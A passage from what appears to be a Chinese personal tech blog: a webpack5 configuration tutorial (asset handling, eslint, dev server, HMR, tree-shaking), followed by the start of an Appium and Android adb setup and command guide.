-D # yarn 引入插件（开发环境） yarn add optimize-css-assets-webpack-plugin -D webpack.config.js 配置 引入：const OptimizeCssAssetsWebpackPlugin = require(‘optimize-css-assets-webpack-plugin’); 创建对象：new OptimizeCssAssetsWebpackPlugin() 点击显/隐代码块 //压缩 css const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); const MiniCssExtractPlugin = require('mini-css-extract-plugin'); const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin'); module.exports = { mode: \"development\", entry: './src/demo/js/index.js', output: { filename: \"[name].js\", path: resolve(__dirname, \"build\") }, module: { rules: [ {test: /\\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader','postcss-loader']}, {test: /\\.less$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'less-loader','postcss-loader']}, {test: /\\.scss$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'sass-loader','postcss-loader'],} ] }, plugins: [ new htmlWebpackPlugin({ template: \"./src/demo/index.html\", filename: \"demo.html\", chunks: ['main'], minify: { collapseWhitespace: true, removeComments: true } }), new MiniCssExtractPlugin({ filename:'./css/demo.css'}), // 用于压缩 css 的，开发环境下可以先不要压缩，不然格式不太好看 new OptimizeCssAssetsWebpackPlugin() ] } 图片资源打包css中引入图片实现方式 webpack4 需要用 file-loader url-loader 这两个插件（需要下载） webpack5 直接使用 assets-module 因为在v5中url-loader已经被废弃（该模块不需要下载） webpack.config.js 配置点击显/隐代码块 //打包图片资源（css html中引入） const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); const MiniCssExtractPlugin = require('mini-css-extract-plugin'); const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin'); module.exports = { mode: \"development\", entry: './src/demo/js/index.js', output: { filename: \"[name].js\", path: resolve(__dirname, \"build\") }, module: { rules: [ {test: /\\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'postcss-loader']}, {test: /\\.less$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'less-loader', 'postcss-loader']}, {test: /\\.scss$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'sass-loader', 'postcss-loader'],}, //打包图片的规则配置，只有一个 loader 可以直接写，不用写在 use 里面 { test: /\\.(jpg|png|gif|jpeg)$/, type: \"asset\", //解析 parser: { dataUrlCondition: { maxSize: 25 * 1024, // 超过25kb不转base64 } }, generator: { //文件生成路径及规则（超出 maxSize 的会在output标签下的 path下，也就是自己定义的 build 下生成 img/文件名.hash值.图片后缀） filename: 'img/[name].[hash:6][ext]', }, }, ] }, plugins: [ new htmlWebpackPlugin({ template: \"./src/demo/index.html\", filename: \"demo.html\", chunks: ['main'], minify: { collapseWhitespace: true, removeComments: true } }), new MiniCssExtractPlugin({ filename: './css/demo.css' }), // 用于压缩 css 的，开发环境下可以先不要压缩，不然格式不太好看 new OptimizeCssAssetsWebpackPlugin() ] } html中引入图片实现方式 使用 html-loader 插件实现 # npm 安装（开发环境） npm i html-loader -i # yarn 安装（开发环境） yarn add html-loader -D webpack.config.js 配置点击显/隐代码块 //打包图片资源（css html中引入） const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); const MiniCssExtractPlugin = require('mini-css-extract-plugin'); const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin'); module.exports = { mode: \"development\", entry: './src/demo/js/index.js', output: { filename: \"[name].js\", path: resolve(__dirname, \"build\") }, module: { rules: [ {test: /\\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'postcss-loader']}, {test: /\\.less$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'less-loader', 'postcss-loader']}, {test: /\\.scss$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'sass-loader', 'postcss-loader'],}, //打包图片的规则配置，只有一个 loader 可以直接写，不用写在 use 里面 { test: /\\.(jpg|png|gif|jpeg)$/, type: \"asset\", //解析 parser: { dataUrlCondition: { //超过25kb不转base64 maxSize: 25 * 1024, } }, generator: { //文件生成路径及规则（超出 maxSize 的会在output标签下的 path下，也就是自己定义的 build 下生成 img/文件名.hash值.图片后缀） filename: 'img/[name].[hash:6][ext]', }, }, {test: /\\.html$/,loader:'html-loader',} // html中引入的图片打包 ] }, plugins: [ new htmlWebpackPlugin({ template: \"./src/demo/index.html\", filename: \"demo.html\", chunks: ['main'], minify: { collapseWhitespace: true, removeComments: true } }), new MiniCssExtractPlugin({ filename: './css/demo.css' }), // 用于压缩 css 的，开发环境下可以先不要压缩，不然格式不太好看 new OptimizeCssAssetsWebpackPlugin() ] } ![html中引入图片](/Users/ada/Library/Application Support/typora-user-images/image-20220215223851559.png) 打包其它资源 不需要优化和压缩处理，直接输出的资源，称为其他资源，如字体 字体icon资源打包流程 iconfont 图标库下载对应的资源后将【.css .ttf .woff .woff2】文件 copy 至项目下 入口 js 中引入 iconfont.css require('../font/iconfont.css') webpack5 直接使用 asset/resource 模块（无需下载） webpack 配置 asset/resource 规则 下载及 copy 字体文件 入口 js 中引入 iconfont 在入口 js 文件中引入 iconfont.css 文件 require('../font/iconfont.css') webpack.config.js 配置点击显/隐代码块 //打包字体资源 const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); const MiniCssExtractPlugin = require('mini-css-extract-plugin'); const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin'); module.exports = { mode: \"development\", entry: './src/demo/js/index.js', output: { filename: \"[name].js\", path: resolve(__dirname, \"build\") }, module: { rules: [ {test: /\\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'postcss-loader']}, {test: /\\.less$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'less-loader', 'postcss-loader']}, {test: /\\.scss$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'sass-loader', 'postcss-loader'],}, { test: /\\.(jpg|png|gif|jpeg)$/, type: \"asset\", parser: { dataUrlCondition: { maxSize: 25 * 1024, } }, generator: { filename: 'img/[name].[hash:6][ext]', }, }, {test: /\\.html$/,loader:'html-loader',}, // html中引入的图片打包 //打包字体资源 { test:/\\.ttf|eot|woff2?$/, type:\"asset/resource\", generator:{ filename:\"font/[name].[hash:6][ext]\" } }, ] }, plugins: [ new htmlWebpackPlugin({ template: \"./src/demo/index.html\", filename: \"demo.html\", chunks: ['main'], minify: { collapseWhitespace: true, removeComments: true } }), new MiniCssExtractPlugin({ filename: './css/demo.css' }), new OptimizeCssAssetsWebpackPlugin() ] } eslint简介 eslint 是一个开源的 js 代码检查工具，初衷是为了让程序员可以创建自己的检测规则。实际生产中，团队内往往会制订一套统一的标准，让整个团队的编码风格达到一致 eslint 其实与 webpack 没有任何关系，两者并不互相依赖，甚至一般情况下我们并不会在 webpack 中进行 eslint 的配置，可以单独使用。 语法检查使用eslint-loader， 并基于eslint包，只用来检查js语法。（eslint-loader –&gt; eslint-webpack-plugin ） 注意只检查自己写的js源代码， 第三方库是不用检查的， 可以在npmjs.com中查看规则。 需要使用js来的规则库来检查代码 “airbnb”， 需要eslint-config-airbnb-base和eslint-plugin-import 两个包 eslin进行检查需要依赖eslint-loader，同时告诉它用什么标准去检查 常用的就是 airbnb airbnb 又依赖 eslint-config-airbnb-base和eslint-plugin-import 两个包 安装插件包 有很多视频在使用 eslint-loader 我在 webpack5.68.0 使用时会有如下报错，网上说 eslint-loader 已经弃用了 采用 eslint-webpack-plugin 插件 Module build failed (from ./node_modules/eslint-loader/dist/cjs.js): TypeError: Cannot read properties of undefined (reading ‘getFormatter’) # npm 安装（开发环境） npm i eslint eslint-config-airbnb-base eslint-plugin-import eslint-webpack-plugin -D # yarn 安装（开发环境） yarn add eslint eslint-config-airbnb-base eslint-plugin-import eslint-webpack-plugin -D 如果在安装的插件的时候有提示 Expected version “^12.22.0 || ^14.17.0 || &gt;=16.0.0” ，需要更换 node 版本 我是在 node 官网下载最近的一个稳定版本重新安装的就可以了 v16.14.0 配置文件 const ESLintPlugin = require(‘eslint-webpack-plugin’); 引入插件 new ESLintPlugin({fix: true }) 使用插件，自动修复不合理写法，规则会根据 package.json 中的 eslintConfig 下 extends 对应的属性去检查 点击显/隐代码块(webpack.config.js) // eslint 语法规范检查 const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); const MiniCssExtractPlugin = require('mini-css-extract-plugin'); const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin'); const ESLintPlugin = require('eslint-webpack-plugin'); module.exports = { mode: \"development\", entry: './src/demo/js/index.js', output: { filename: \"[name].js\", path: resolve(__dirname, \"build\") }, module: { rules: [ {test: /\\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'postcss-loader']}, {test: /\\.less$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'less-loader', 'postcss-loader']}, {test: /\\.scss$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'sass-loader', 'postcss-loader'],}, { test: /\\.(jpg|png|gif|jpeg)$/, type: \"asset\", parser: { dataUrlCondition: { maxSize: 25 * 1024, } }, generator: { filename: 'img/[name].[hash:6][ext]', }, }, {test: /\\.html$/, loader: 'html-loader',}, // html中引入的图片打包 //打包字体资源 { test: /\\.ttf|eot|woff2?$/, type: \"asset/resource\", generator: { filename: \"font/[name].[hash:6][ext]\" } } ] }, plugins: [ new htmlWebpackPlugin({ template: \"./src/demo/index.html\", filename: \"demo.html\", chunks: ['main'], minify: { collapseWhitespace: true, removeComments: true } }), new MiniCssExtractPlugin({ filename: './css/demo.css' }), new OptimizeCssAssetsWebpackPlugin(), //js语法检查 new ESLintPlugin({ fix: true // 自动修复不合理的写法 }) ] } 点击显/隐代码块(package.json) “scripts”: { “eslint”: “eslint src” } 在控制台可通过执行 npm run eslint 或者 yarn eslint 会去检查 src目录下的 js 规范 “eslintConfig”: { “extends”: “airbnb-base” } 定义的检查规范为 airbnb-base { \"scripts\": { \"eslint\": \"eslint src\" }, \"devDependencies\": { \"css-loader\": \"^6.6.0\", \"eslint\": \"^8.9.0\", \"eslint-config-airbnb-base\": \"^15.0.0\", \"eslint-plugin-import\": \"^2.25.4\", \"eslint-webpack-plugin\": \"^3.1.1\", \"html-loader\": \"^3.1.0\", \"html-webpack-plugin\": \"^5.5.0\", \"less\": \"^4.1.2\", \"less-loader\": \"^10.2.0\", \"mini-css-extract-plugin\": \"^2.5.3\", \"node-sass\": \"^7.0.1\", \"optimize-css-assets-webpack-plugin\": \"^6.0.1\", \"postcss-loader\": \"^6.2.1\", \"postcss-preset-env\": \"^7.3.3\", \"sass-loader\": \"^12.4.0\", \"style-loader\": \"^3.3.1\", \"webpack\": \"^5.68.0\", \"webpack-cli\": \"^4.9.2\" }, \"dependencies\": { \"jquery\": \"^3.6.0\" }, \"browserslistcomment\": \"支持80%以上的浏览器,支持最后两个版本,忽略已经死掉的浏览器\", \"browserslist\": [ \"&gt; 0.2%\", \"last 2 version\", \"not dead\" ], \"eslintConfig\": { \"extends\": \"airbnb-base\" } } 特殊配置 有的时候想针对某行代码跳过检查只需要在该行代码上添加 // eslint-disable-next-line 即可跳过对下一行的检查（只针对下一行有效） 热部署简介 在前面的章节中，我们每次写完程序或者修改了内容后都需要通过 webpack 进行打包到 build 目录，这种情况一般是用在生产环境，开发完了打包测试上线，在实际的工作中我们更加希望我们每次修改完代码后就能够自动刷新对应的 html css js 等内容便于我们实时的查看调试，这也就本次记录的内容热部署 devServer给我们提供了开发过程中的服务器，是一个使用了express的Http服务器，它的作用主要是为了监听资源文件的改变，该http服务器和client使用了websocket通信协议，只要资源文件发生改变，webpack-dev-server就会实时的进行编译。 只会在内存中编译，不会有任何输出,下载webpack-dev-server包 webpack-dev-server并不能读取你的webpack.config.js的配置output 也就是说每次修改了配置文件需要手动重启一下，修改其它的 html css js 会自动刷新 启动devServer指令为: npx webpack serve 本目录执行 webpack5无法自动刷新，解决：添加配置：target: ‘web’ 流程 下载 webpack-dev-server 包 webpackage.config.js 下新增 devServer 属性用于指定端口等信息 package.json 中指定启动命令 示例下载包# npm 安装（开发环境） npm i webpack-dev-server -D # yarn 安装（开发环境） yarn add webpack-dev-server -D webpack.config.js 配置 每次配置文件 webpack.config.js 发生了变化需要重启 devServer 服务器（因为配置文件是在启动时生效，发生改变不能修改启动时的参数设置这些） 注释了 eslint 检查（开发环境不方便） 去除了 mode: \"development\" 更改为在启动命令 scripts 中指定 新增 target devServer htmlWebpackPlugin filename 需要指定为 index.html 不然会报错 404（应该是热部署启动后默认去读取 index.html 文件） 如果自动刷新无效的话注意一般是开启了HMR(devServer中 hot:true) 看 entry属性下有没有配置需要监听的html（entry: [‘./src/demo/js/index.js’,’./src/demo/index.html’]） 这里的./src/demo/index.html 就是需要自动刷新的页面 点击显/隐代码块 // 热部署 htmlWebpackPlugin filename 需要指定为 index.html 不然会报错 404 const {resolve} = require(\"path\"); const htmlWebpackPlugin = require('html-webpack-plugin'); const MiniCssExtractPlugin = require('mini-css-extract-plugin'); const OptimizeCssAssetsWebpackPlugin = require('optimize-css-assets-webpack-plugin'); const ESLintPlugin = require('eslint-webpack-plugin'); module.exports = { entry: ['./src/demo/js/index.js','./src/demo/index.html'], output: { filename: \"[name].js\", path: resolve(__dirname, \"./build\") }, module: { rules: [ {test: /\\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'postcss-loader']}, {test: /\\.less$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'less-loader', 'postcss-loader']}, {test: /\\.scss$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'sass-loader', 'postcss-loader'],}, { test: /\\.(jpg|png|gif|jpeg)$/, type: \"asset\", parser: { dataUrlCondition: { maxSize: 25 * 1024, } }, generator: { filename: 'img/[name].[hash:6][ext]', }, }, {test: /\\.html$/, loader: 'html-loader',}, // html中引入的图片打包 //打包字体资源 { test: /\\.ttf|eot|woff2?$/, type: \"asset/resource\", generator: { filename: \"font/[name].[hash:6][ext]\" } } ] }, plugins: [ new htmlWebpackPlugin({ template: \"./src/demo/index.html\", filename: \"index.html\", chunks: ['main'], minify: { collapseWhitespace: true, removeComments: true } }), new MiniCssExtractPlugin({ filename: './css/demo.css' }), new OptimizeCssAssetsWebpackPlugin(), //js语法检查 /*new ESLintPlugin({ fix: true // 自动修复不合理的写法 })*/ ], // 在webpack5 需要加上这个配置项才可以自动刷新，如果自动刷新无效的话注意一般是开启了HMR(devServer中 hot:true) 看 entry属性下有没有配置需要监听的html target: \"web\", devServer: { port:3001, compress:true, open:true, hot:true } } content-base //设定webpack-dev-server的director根目录。如果不进行设定的话，默认是在当前目录下。 quiet: //控制台中不输出打包的信息，开发中一般设置为false，进行 打印，这样查看错误比较方面 no-info: // 不显示任何信息 colors: //对信息进行颜色输出 no-colors: //对信息不进行颜色输出 compress: //开启gzip压缩 host &lt;hostname/ip&gt;: //设置ip port : //设置端口号，默认是:8080 inline: //webpack-dev-server会在你的webpack.config.js的入口配置文件中再添加一个入口, hot: //开发热替换 open: //启动命令，自动打开浏览器 history-api-fallback: //查看历史url package.json scripts下新增 dev build 通过命令指定开发模式启动或者打包，并且携带参数指定 mode 这样就不需要在 webpack.config.js 中指定 mode 命令行中的比配置文件中参数的优先级高 点击显/隐代码块 { \"scripts\": { \"eslint\": \"eslint src\", \"dev\": \"webpack serve --mode development\", \"build\": \"webpack --mode production\" }, \"devDependencies\": { \"css-loader\": \"^6.6.0\", \"eslint\": \"^8.9.0\", \"eslint-config-airbnb-base\": \"^15.0.0\", \"eslint-plugin-import\": \"^2.25.4\", \"eslint-webpack-plugin\": \"^3.1.1\", \"html-loader\": \"^3.1.0\", \"html-webpack-plugin\": \"^5.5.0\", \"less\": \"^4.1.2\", \"less-loader\": \"^10.2.0\", \"mini-css-extract-plugin\": \"^2.5.3\", \"node-sass\": \"^7.0.1\", \"optimize-css-assets-webpack-plugin\": \"^6.0.1\", \"postcss-loader\": \"^6.2.1\", \"postcss-preset-env\": \"^7.3.3\", \"sass-loader\": \"^12.4.0\", \"style-loader\": \"^3.3.1\", \"webpack\": \"^5.68.0\", \"webpack-cli\": \"^4.9.2\", \"webpack-dev-server\": \"^4.7.4\" }, \"dependencies\": { \"jquery\": \"^3.6.0\" }, \"browserslistcomment\": \"支持80%以上的浏览器,支持最后两个版本,忽略已经死掉的浏览器\", \"browserslist\": [ \"&gt; 0.2%\", \"last 2 versions\", \"not dead\" ], \"eslintConfig\": { \"extends\": \"airbnb-base\" } } 环境优化 开发环境的优化：打包构建速度（比如我们只更新了一个js文件重新编译的时候只编译这一个 js 文件，热加载）、优化代码调式 生产环境的优化：代码运行的性能（例如尽量减小代码文件的大小，只打包引用到了的 css js ） 开发环境HMR(模块热替换) 热模块替换一般是针对开发环境的优化 模块热替换(Hot Module Replacement 即 HMR)是 webpack 提供的最有用的功能之一, 它允许在运行时更新各种模块, 而无需进行完全刷新。 启用这个功能，只需要修改一下 webpack.config.js 的配置, 使用 webpack 内置的 HMR 插件就可以了， 在devServer中使用hot参数（hot:true）。 启用 webpack 内置的 HMR插件后, module.hot 接口就会暴露在 index.js 中, 接下来需要在 index.js 中配置告诉 webpack 接受HMR的模块。 样式文件 样式文件(css less sass)在使用HMR功能的时候，开发环境中使用style-loader（之前使用的 MiniCssExtractPlugin.loader 把所有 css less sass 打包成一个单独的文件，这样 HMR 就没有意义了因为更新了这个所有打包一起的文件比较大，开发环境使用 style-loader 就不会打包成单独的文件，这样就能做到只更新这一个样式文件 ） 这里我没去实践，一般是会根据配置什么的去设置比如开发环境用 style-loader 线上用 MiniCssExtractPlugin.loader 打包成一个 css 文件 html HTML 的HMR功能，默认也没有HMR功能（不用做HMR功能）需要在entry入口中引入html文件(entry:[‘./src/demo/js/index.js’,’./src/demo/index.html’]) js js的HMR功能，默认没有HMR功能，只能处理非入口文件的js文件 启用 webpack 内置的 HMR插件后, module.hot 接口就会暴露在 index.js 中, 接下来需要在 index.js 中配置告诉 webpack 接受HMR的模块（通过代码 module.hot.accept） 如上图所示当一个 js 文件发生变化时，所有的 js 都会去执行，如果想要去实现只更新我们自己修改了的 js 文件需要在入口文件中通过代码指定文件示例如下 if (module.hot) { //告诉 webpack 接受热替换的模块为 ./print.js module.hot.accept('./print.js', function() { //服务器检测到了 print.js 的代码变化后需要执行的 module.hot.accept 的回调函数 console.log('./print.js 这个文件有发生变化'); }) } 修改 print.js 中将 【111】改为 【33333】 后并未执行 index.js 中的打印语句（打包 css样式的 js 文件这句话），只执行了module.hot.accept的回调函数 修改 print.js后并未再次打印这句话，也就证明热加载只加载了 print.js HMR 中只监听了 print.js 服务器检测到了 print.js 的代码变化后需要执行的 module.hot.accept 的回调函数 ![HMR-js配置后](/Users/ada/Library/Application Support/typora-user-images/image-20220223232055475.png) 线上环境(去除死代码) 该内容是针对线上环境 且指的是 js css 这类文件 html文件 不需要，因为如果不需要的 html 我们会注释掉，然后打包的时候会去压缩注释掉的内容，但是 js css 这些可能会留着暂时不注释，可能以后会用，那么我们就期望打包的时候 没有引用的 js css 这些东西不打包进去（比如去网上 copy 了一个一万行的js 但是我们只用了其中的一部分，但是又不敢乱删除，以前的方法就会把所有的一万行打包进去，优化了的话它自动就会去找到这一万行代码中我们使用到的 js 打包进去） 或者说引入的第三方的BootStrap jQuery 我们也期望只把我们项目使用到的js css 打包进去多余的就不要 js Webpack通过 tree-shaking 去掉了实际上并没有使用的js代码来减少包的大小 tree-shaking 是 webpack 自带的功能不需要下载其它的包（tree-shaking:树摇，摇晃树子把黄了的叶子摇下来不要） 前提条件：必须使用es6模块化 开启production环境（mode中指定） css下载插件# npm 安装（开发环境） npm i purgecss-webpack-plugin -D # yarn 安装（开发环境） yarn add purgecss-webpack-plugin -D webpack.config.js 配置 plugins下新增以下内容 四个引入 const 一个 new //const {resolve, join} = require('path'); //const PurgecssPlugin = require('purgecss-webpack-plugin'); //const glob = require('glob'); //const PATHS = { src: join(__dirname, 'src')} new PurgecssPlugin({ paths: glob.sync(`${PATHS.src}/**/*`, {nodir: true}), }),","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"前端基础","slug":"前端基础","permalink":"https://www.adalucky.com/tags/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/"},{"name":"webpack5","slug":"webpack5","permalink":"https://www.adalucky.com/tags/webpack5/"},{"name":"eslint","slug":"eslint","permalink":"https://www.adalucky.com/tags/eslint/"}],"author":"Ada"},{"title":"app","slug":"Auto/APP","date":"2022-02-18T10:41:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/app/","link":"","permalink":"https://www.adalucky.com/auto/app/","excerpt":"Appium是一个开源的，适用于原生或混合移动应用（ hybrid mobile apps ）的自动化测试工具，Appium应用WebDriver: JSON wire protocol驱动安卓和iOS移动应用。Appium选择了Client/Server的设计模式。只要client能够发送http请求给server，那么的话client用什么语言来实现都是可以的，这就是如何做到支持多语言的原因；","text":"Appium是一个开源的，适用于原生或混合移动应用（ hybrid mobile apps ）的自动化测试工具，Appium应用WebDriver: JSON wire protocol驱动安卓和iOS移动应用。Appium选择了Client/Server的设计模式。只要client能够发送http请求给server，那么的话client用什么语言来实现都是可以的，这就是如何做到支持多语言的原因； 参考资料 需要安装的环境和程序：==adb== ==Appium== ==jdk== Android adb环境windows安装 前置：电脑已==安装手机驱动==，==usb==调试模式已打开（开发者选项和usb模拟点击根据情况后面会需要打开） 1.下载安装包（32/64位），解压到非中文路径且路径名无特殊字符 2.配置系统环境变量和 path 路径 mac安装下载cmdline-tools 下载cmdline-tools cmdline-tools的作用是通过命令行去控制下载 SDK 工具包如：platform-tools tools build-tool 等 创建目录：/Users/ada/Library/Android/sdk/cmdline-tools/latest 存放下载的 cmdline-tools 下载链接：https://developer.android.google.cn/studio?hl=zh_cn （页面滑动往下面拉一点找下） 文件解压 默认情况下sdk同级的其它文件都是没有的，我这边是因为后面下载了工具包所以截图里面有 sdkmanager 命令行操作 由于没有配置全局环境，需要先切换到bin目录 执行./sdkmanager # 切换路径 cd /Users/ada/Library/Android/sdk/cmdline-tools/latest/bin # 包管理查看 ./sdkmanager --list 安装包 通过 sdkmanager 安装 build-tools platform-tools tools 语法参考官方：https://developer.android.google.cn/studio/command-line/sdkmanager?hl=zh_cn #安装软件包 sdkmanager packages [options] #官方示例 sdkmanager 包名 可选参数 #例如，下面展示了如何安装最新的平台工具（包括 adb 和 fastboot）以及适用于 API 级别 28 的 SDK 工具： sdkmanager \"platform-tools\" \"platforms;android-28\" # 这个是官方的示例，根据意思如果不加;号指定版本就是最新的,多个包用空格隔开，用\"\"括起来 #下载build-tools指定版本 sdkmanager \"build-tools;30.0.2\" #卸载软件包 sdkmanager --uninstall packages [options] sdkmanager --uninstall --package_file=package_file [options] #更新已安装的软件包 sdkmanager --update [options] 环境配置 配置==系统环境变量== 注意上面的高亮，是配置系统环境变量，和windows一样有用户变量，只对当前用户有效，系统变量对所有用户有效，Appium在启动后只认系统变量如果设置的是用户变量到时候可能一直提示你没有设置 ==JAVA_HOME== ==ANDROID_HOME== 在Macx系统中 ==/etc/profile== 是系统变量配置文件 ==~/.bash_profile== 是用户变量 在编辑 /etc/profile 文件的时候如果提示没有权限,那么找到 /etc 文件夹和 profile 文件添加用户的读写权限 修改这种配置文件记得先备份，养成良好的习惯 Mac配置系统变量 ==Android_HOME== ==JAVA_HOME==（再提示一遍是系统变量） #步骤一： 打开系统变量配置文件 和 ~/.zshrc文件 open -e /etc/profile open -e ~/.zshrc # 步骤二：添加配置（/etc/profile文件）保存 # Java系统变量 export JAVA_HOME=$(/usr/libexec/java_home) export PATH=$JAVA_HOME/bin:$PATH export CLASS_PATH=$JAVA_HOME/lib # Android系统变量 AAPT_HOME=/Users/ada/Library/Android/sdk/build-tools/30.0.2/ export AAPT_HOME export PATH=$PATH:$AAPT_HOME ANDROID_HOME=/Users/ada/Library/Android/sdk export PATH=$ANDROID_HOME/tools:$PATH export PATH=$ANDROID_HOME/tools/bin:$PATH export PATH=$ANDROID_HOME/platform-tools:$PATH export PATH=$ANDROID_HOME/build-tools/30.0.2:$PATH export PATH=$ANDROID_HOME/emulator:$PATH export ANDROID_HOME export ANDROID_SDK_ROOT=/Users/ada/Library/Android/sdk export PATH=$ANDROID_SDK_ROOT/emulator:$ANDROID_SDK_ROOT/tools:$PATH # 步骤三：添加配置（~/.zshrc文件）保存 source /etc/profile source ~/.bash_profile #步骤四：source 生效一下 source /etc/profile source ~/.zshrc adb环境验证 在cmd、终端输入 ==adb version==查看是否安装成功 #查看adb的版本 adb version #查看设备连接 adb devices Appium启动验证 uiautomatorviewer启动校验 uiautomatorviewer 是 adb 工具包里面的一个元素探测工具，用于定位识别元素为后期自动化ui元素定位提供基础数据 adb常用命令基础命令查看当前版本#查看当前的 adb 版本 (这个版本好像低于38 39还是哪个版本以下的如果执行键盘输入中文到app输入框会有乱码现象，之前用DeskDock键盘输入) adb version 设备检查及输入#查看adb的帮助手册 adb --help # 检查连接到电脑的安卓设备 adb devices #如果有检测到可以验证一下：模拟点击手机返回的命令，手机会模拟返回按键操作，有反应代表连接正常 adb shell input keyevent #状态 device 在线 offline 离线 unauthorized 未授权 List of devices attached 未检测到 连接模拟器#有时候没有真机，或者真机的版本太高不好获得root权限可以采用模拟器 推荐模拟器【夜神、雷电模拟器】 adb connect 127.0.0.1:62001 #(先把模拟器打开)，127.0.0.1指的使用本机，62001是夜神模拟器的端口号，根据你的模拟器端口可能会有变化 设备操作进入设备终端#进入到设备的终端控制台 就像xshell连接服务器一样，andriod底层是基于linux的，需要连接，然后也可以用linux命令 adb shell #退出终端 当需要回退到cmd窗口进行adb命令操作时 exit 或者 adb shell 从手机中拉取文件至本地#将手机中的文件拉取到你自己的电脑本地，一般会用于日志的拉取或者tcpdump对网卡的抓包信息 adb pull &lt;手机路径，源文件&gt; &lt;本机路径，目标文件&gt; 上传文件#将本地的文件上传/推送到设备中 adb push &lt;本机路径，源文件&gt; &lt;手机路径，目标路径&gt; /新命名文件 #这里有个小窍门，就是push后面本地文件，可以直接找到拖进去，不用手动输本地路径，可以重复推送，自动覆盖 手机日志#清理main缓存区域的日志 adb logcat -c #清理系统事件信息日志 adb logcat -c -b events #清理手机内所有日志的命令(如果手机之前的日志不需要了一般用这个) adb logcat -c -b main -b events -b radio -b system #拉取日志 这里本地路径必须是一个目录，前面是大于符号重定向，后面要给拉取的日志取一个别名，不然拉取会失败，日志是动态的，所以估计3-5秒拉取完成后用ctrl+c/z/x 结束根据电脑快捷键决定 adb logcat &gt; &lt;本地路径&gt; 命名日志名.txt 指令#可以通过adb输入一些指令，让设备做对应的动作，比如模拟我们的滑动，截屏，输入等等 #截屏 adb shell screencap -p 文件输出路径/fileName.png adb shell screencap -p /sdcard/01.png #截屏并保存在/sdcard/01.png这个路径 #录屏 adb shell screenrecord /sdcard/fileName.mp4 #ctrl+c结束 --size 设置分辨率 --bit-rate 指定比特率 --rotate 旋转90° #模拟点击返回按钮 adb shell input keyevent #模拟手势滑动点击（实现微信跳一跳高分核心方法） adb shell input touchscreen swipe x1 y1 x2 y2 time #(x1,y1)：起始点击点的x y位置 (x2,y2)：终止点击点的x位置 time：操作耗时毫秒数 # 单击屏幕屏幕（点击） adb shell input tap X坐标 Y坐标 包管理安装/卸载APP#和上传一样可以直接拖，注意格式是apk的文件（手机usb模式换成文件传输，不能为充电模式），成功后会提示success 提示：adb: failed to install，表示有安装过同名的包，可以采用下面的覆盖安装 adb install &lt;安装包路径&gt; #覆盖安装 adb install -r &lt;安装包路径&gt; #静默安装 这个不会，据说在比较老的Android版本中支持，它的作用就是安装后同时赋予默认的权限，在自动化测试时候如果监测到没有安装对应的APP那么可以采用尝试，静默安装 #卸载 提示success,代表成功 adb uninstall &lt;应用包名，一般是com.xxxx.xxxx格式&gt; 包名及入口获取 包名、类名、主入口 package（包名）：在APP中每个APP都拥有唯一的包名不能重复，如果重复了就会提示你已经安装是否覆盖安装 MainActivity（主入口）：每个APP都有一个主要函数的入口 activityName（类名）：可以看做是每个页面的一个标识句柄 前台页面查看查看包名类名#把软件打开保持前台界面，运行命令 adb shell dumpsys activity | find \"mFocusedActivity\" #安卓7以内 adb shell dumpsys activity | find \"mResumedActivity\" #安卓8以上 #Mac查看包名、主入口 adb shell dumpsys window w |grep \\/ |grep name=\u001a u0 com.xxxx.xxxx/ uo和/中间的就是包名，以com开头，包名后面跟类名，如果没有查到先把软件关了，重新打开 ，F A记得大写（小驼峰，第一个小写，后面首字母大写） 查看启动入口 先把需要查询的App关掉，然后清除日志，再打开“动态监控”，然后启动App #清除日志（关闭 app 后执行） adb logcat -c # 动态监控 adb logcat | find \"Display\" 后台查看 在不运行APP的情况下，直接查看本地的APP文件 需要在adb 的 build-tools目录下（aapt同级目录）启动cmd窗口或者配置path路径 查看包名和启动入口# 查看.apk安装包的包名和启动入口 aapt dump badging apk文件路径 查看包名#查看文件的包名 aapt dump badging C:\\Users\\Administrator\\Desktop\\inc.apk(APP的路径) | find \"package\" 查看启动入口aapt dump badging C:\\Users\\Administrator\\Desktop\\inc.apk | find \"launchable-activity\" 扩展系统# dumpsys meminfo 包名 #读取电量和温度 adb shell dumpsys battery # 内存使用信息 adb shell dumpsys meminfo #查看启动时间（一般是看冷启动） (注意大小写，和更换包名，thistime totaltime里面的数据就是启动时间) adb shell am start -W com.lemon.lemonban/.activity.WelcomeActivity #获取当前设备的IP地址（wifi） adb shell \"ip addr | grep global\" 其它#启动应用 adb shell am start -n 包名/启动入口 adb shell am start -n com.inc.mobile.manager/com.inc.mobile.manager.view.ui.activity.LaunchActivity #多台设备下指定一台设备操作 adb -s devicesName 指令 #adb进程服务 adb start-server 重启服务 adb 